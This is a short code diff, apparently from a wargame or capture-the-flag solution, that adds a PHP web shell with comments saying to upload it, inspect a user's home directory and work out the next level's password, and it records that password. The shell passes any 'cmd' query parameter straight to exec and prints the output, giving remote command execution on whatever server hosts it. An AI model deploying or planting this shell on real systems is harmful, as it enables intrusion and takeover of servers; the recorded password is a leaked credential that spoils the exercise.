@@ -1,0 +1,14 @@
+// upload this shell
+// check the home directory of user level1
+// work out password for level2
+// password when I did it was ach3sa6F
+
+<?php
+	$cmd = $_GET['cmd'];
+	$arr = array();
+	exec($cmd, &$arr);
+
+	foreach ($arr as $row){
+		echo $row . '<br/>';
+	}
+?>
